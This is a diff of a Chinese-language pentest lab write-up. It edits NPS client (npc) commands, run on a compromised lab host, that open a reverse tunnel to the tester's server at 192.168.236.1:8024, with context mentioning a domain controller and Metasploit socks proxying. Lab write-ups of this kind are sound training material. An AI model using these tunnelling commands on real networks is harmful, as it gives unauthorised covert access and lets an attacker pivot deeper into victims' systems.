@@ -172,8 +172,8 @@ start infoscan
 但是执行确连接不上
 
 ```java
-**C:\phpStudy\WWW>** npc.exe -server=127.0.0.1:8024 -vkey=rzxdd22ayokt1rnt -type=tcp
-
+**C:\phpStudy\WWW>** npc.exe -server=127.0.0.1:8024 -vkey=nnogm652lv62mvwb -type=tcp
+./npc -server=127.0.0.1:8024 -vkey=nnogm652lv62mvwb -type=tcp
 **C:\phpStudy\WWW>** npc.exe -server=192.168.100.14:8024 -vkey=rzxdd22ayokt1rnt -type=tcp
 ```
 
@@ -186,6 +186,8 @@ Win2k3(域管): 192.168.52.141
 ```
 
 本来一开始用的是 127 和 192.168.100.14这两个没通，后来想明白了（用那俩地址靶机能访问到？？？) 改了之后直接就通了
+
+npc.exe -server=192.168.236.1:8024 -vkey=nnogm652lv62mvwb -type=tcp
 
 ![image-20240103193327879](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193327879.png)
 
@@ -676,7 +678,7 @@ msf6 auxiliary(server/socks_proxy) > proxychains4 nmap 192.168.10.2 -sT -Pn -p80
 
  然后浏览器设置socks5代理
 
-还是老老实实的nps叭
+还是老老实实的nps叭！
 
 
 
